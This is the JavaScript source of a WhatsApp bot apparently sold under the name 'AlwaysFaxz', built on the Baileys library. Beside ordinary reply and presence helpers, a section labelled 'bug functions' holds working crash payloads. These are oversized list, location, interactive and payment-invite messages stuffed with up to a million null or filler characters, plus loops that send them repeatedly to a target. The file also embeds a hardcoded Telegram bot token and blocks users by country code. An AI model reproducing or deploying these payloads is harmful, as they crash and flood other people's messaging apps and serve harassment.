//Base By Xeon
//々 𝐴𝑙𝑤𝑎𝑦𝑠 𝐹𝑎𝑥𝑧 𝑁𝑜 𝐶𝑜𝑢𝑛𝑡𝑒𝑟 々
//Script Ini Di Jual
//By Always Faxz
//My whatsapp 6285809388803 & 6283116555026
//My Tiktok account @faxz4you_real
//My Instagram account @abcdefaxz
//not share free my script
//© Always Faxz - 2024

const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { Client } = require('ssh2');
const stream = require('stream');
const threshold = 0.72
const { fromBuffer } = require('file-type')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const NodeCache = require('node-cache');

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Jakarta').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Jakarta').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Selamat Siang 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Selamat Pagi 🌄`
 } 
module.exports = AlwaysFaxzMd = async (AlwaysFaxzMd, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await AlwaysFaxzMd.decodeJid(AlwaysFaxzMd.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await AlwaysFaxzMd.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isFaxzCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isFaxzCreator || isFaxzCreator || checkPremiumUser(m.sender, premium);
        const clientId = AlwaysFaxzMd.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? AlwaysFaxzMd.user.id.split(':')[0] + "@s.whatsapp.net" || AlwaysFaxzMd.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(AlwaysFaxzMd, m, premium);
//group chat msg by xeon
const replyalwaysfaxz = (teks) => {
AlwaysFaxzMd.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `★ AlwaysFaxz-DigitalBotz ★`,
"body": `★ ÂlwâysFâxz ★`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./lib/system/thumb.jpg`),
"sourceUrl": `https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z`}}},
{ quoted: m})
}

const ReplyFaxz = (teks) => {
AlwaysFaxzMd.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `々 𝐴𝑙𝑤𝑎𝑦𝑠 𝐹𝑎𝑥𝑧 々`,
"body": `Hay ${pushname} 😈`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://telegra.ph/file/21890379ccf56fb8760c8.jpg',
"sourceUrl": 'https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z'}}},
{ quoted: fkontak})
}

const reply = (teks) => {
AlwaysFaxzMd.sendMessage(from, { text: teks }, { quoted : fkontak })
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyalwaysfaxz('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6283116555026:6283116555026\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
//tambahan si soalnya sebelum gw tambah eror

async function streamToBuffer(stream) {
return new Promise((resolve, reject) => {
let chunks = [];
stream.on('data', chunk => chunks.push(chunk));
stream.on('end', () => resolve(Buffer.concat(chunks)));
stream.on('error', reject);
});
}

//JAN DI DELETE CAPE BENERIN EROR NJING
const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `ÂlwâysFâxz`
}
}
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await AlwaysFaxzMd.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await AlwaysFaxzMd.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "ÂlwâysFâxz",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: AlwaysFaxzMd.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #ÂlwâysFâxz"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await AlwaysFaxzMd.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await AlwaysFaxzMd.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "ÂlwâysFâxz"+" ".repeat(920000),
        'footerText': `ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz`,
        'description': `ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz ÂlwâysFâxz`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await AlwaysFaxzMd.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  AlwaysFaxzMd.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   AlwaysFaxzMd.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    AlwaysFaxzMd.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await AlwaysFaxzMd.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await AlwaysFaxzMd.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await AlwaysFaxzMd.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  AlwaysFaxzMd.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  AlwaysFaxzMd.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return AlwaysFaxzMd.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return AlwaysFaxzMd.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const xeonimun = (texto) => {
AlwaysFaxzMd.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return replyalwaysfaxz("Erro..")
})
}

const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
AlwaysFaxzMd.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions
//cuki pw by faxz
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+()/*=×';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
//end func random pw
//randoms pw by faxz

async function loading () {
var xeonlod = [
"*[ ##================== ] 10%*",
"*[ ####================ ] 20%*",
"*[ ######============== ] 30%*",
"*[ ########============ ] 40%*",
"*[ ##########========== ] 50%*",
"*[ ############======== ] 60%*",
"*[ ##############====== ] 70%*",
"*[ ################==== ] 80%*",
"*[ ##################== ] 90%*",
"*[ #################### ] 100%*",
"★ *`Løâdîñg Sêlêsâî`* ★"
]
let { key } = await AlwaysFaxzMd.sendMessage(from, {text: '★ AlwaysFaxz-DigitalBotz ★'})

for (let i = 0; i < xeonlod.length; i++) {
await AlwaysFaxzMd.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!AlwaysFaxzMd.public) {
            if (!isFaxzCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            AlwaysFaxzMd.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        AlwaysFaxzMd.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        AlwaysFaxzMd.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        AlwaysFaxzMd.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        AlwaysFaxzMd.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            AlwaysFaxzMd.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return AlwaysFaxzMd.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await AlwaysFaxzMd.getName(i),
